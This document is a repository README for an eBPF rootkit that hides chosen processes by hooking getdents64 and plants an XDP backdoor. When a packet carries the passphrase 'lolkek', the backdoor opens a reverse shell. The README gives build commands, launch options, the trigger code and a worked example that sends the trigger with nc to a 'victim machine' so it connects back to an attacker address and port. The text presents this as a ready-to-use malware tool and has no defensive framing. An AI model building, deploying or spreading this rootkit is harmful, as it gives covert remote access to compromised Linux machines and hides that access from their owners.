# eBPF-rootkit

This repository contains an eBPF rootkit that combines 2 main functions:

Backdoor for remote access - uses `XDP` (eXpress Data Path) to monitor network traffic and launch a reverse shell when detecting a specific pattern in packets.

Process Hiding - uses eBPF programs attached to the `getdents64` system call to hide specific processes from tools like `ps`, `htop`, `ls` etc.

The process hiding part is taken from the [bad-bpf repository](https://github.com/pathtofile/bad-bpf/), but the loader has been rewritten in Go.

## Dependencies
To build and run the project, you will need:

* Go (version 1.16+)
* Clang and LLVM (for compiling eBPF programs)
* Linux kernel header files
* Cilium eBPF library for Go

```bash
# Installing dependencies on Ubuntu/Debian:

sudo apt update  
sudo apt install -y clang llvm libbpf-dev linux-headers-$(uname -r)  
go get github.com/cilium/ebpf

# Building and Running

git clone https://github.com/cotsom/eBPF-rootkit.git  
cd eBPF-rootkit
go generate
go build -o ebpf-rootkit
```

Run with root privileges:

```bash
./ebpf-rootkit [options]
Launch Options:
-p <PID> - PID of the process to hide (default: PID of the program itself)
-t <PPID> - Parent PID, will only affect its child processes
-i <interface> - Network interface to attach the XDP program to (default: eth0)
```

## Changing the Passphrase for the Reverse Shell
For now the passphrase that triggers the reverse shell is `lolkek`

```go
dataStr := string(data)
if strings.Contains(dataStr, "lolkek") {
    log.Printf("XDP: Found 'lolkek' trigger in packet data: %q", dataStr)
    parts := strings.Fields(dataStr)

....
```

To change the passphrase, replace the string `lolkek` with your own phrase. This phrase is used as a trigger to launch the reverse shell.

After changing the passphrase, you need to rebuild the project:

`go build -o ebpf-rootkit`

To launch the reverse shell, send a TCP packet containing your passphrase followed by the IP address and port to connect to, for example:

```bash
nc 192.168.1.100 22 # connect to victim machine with backdoor to any open port

# send command to nc
lolkek 192.168.1.200 4444
```
